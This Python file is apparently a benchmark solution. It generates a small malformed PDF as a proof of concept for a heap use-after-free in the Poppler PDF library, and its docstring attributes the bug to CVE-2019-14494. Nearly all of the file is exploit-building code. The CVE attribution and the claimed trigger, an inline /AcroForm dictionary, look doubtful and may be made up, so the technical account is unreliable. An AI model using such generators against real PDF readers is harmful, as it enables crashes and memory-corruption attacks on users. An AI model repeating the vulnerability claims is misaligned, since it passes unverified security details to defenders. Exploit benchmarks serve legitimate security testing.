class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC for the Poppler Heap Use After Free vulnerability (CVE-2019-14494).
        The vulnerability occurs when an inline Dictionary is passed as the /AcroForm entry
        in the Catalog. The Form constructor creates a temporary Object wrapping this Dict
        without incrementing the reference count. When the temporary Object is destroyed,
        it decrements the ref count, freeing the Dict prematurely if it was a direct object.
        """
        
        # PDF Header with binary marker
        header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"
        
        # Object 1: Catalog
        # The trigger is /AcroForm defined as a direct dictionary << ... >>
        obj1 = (
            b"1 0 obj\n"
            b"<< /Type /Catalog\n"
            b"   /Pages 2 0 R\n"
            b"   /AcroForm << /Fields [] >>\n"
            b">>\n"
            b"endobj\n"
        )
        
        # Object 2: Pages
        obj2 = (
            b"2 0 obj\n"
            b"<< /Type /Pages\n"
            b"   /Kids [3 0 R]\n"
            b"   /Count 1\n"
            b">>\n"
            b"endobj\n"
        )
        
        # Object 3: Page
        obj3 = (
            b"3 0 obj\n"
            b"<< /Type /Page\n"
            b"   /Parent 2 0 R\n"
            b"   /MediaBox [0 0 612 792]\n"
            b">>\n"
            b"endobj\n"
        )
        
        body = obj1 + obj2 + obj3
        
        # Calculate offsets for XRef table
        off1 = len(header)
        off2 = off1 + len(obj1)
        off3 = off2 + len(obj2)
        xref_pos = off3 + len(obj3)
        
        # Construct XRef table
        # Format: offset generation number in use/free
        xref = (
            f"xref\n"
            f"0 4\n"
            f"0000000000 65535 f \n"
            f"{off1:010d} 00000 n \n"
            f"{off2:010d} 00000 n \n"
            f"{off3:010d} 00000 n \n"
        ).encode('latin-1')
        
        # Trailer
        trailer = (
            f"trailer\n"
            f"<< /Size 4\n"
            f"   /Root 1 0 R\n"
            f">>\n"
            f"startxref\n"
            f"{xref_pos}\n"
            f"%%EOF"
        ).encode('latin-1')
        
        return header + body + xref + trailer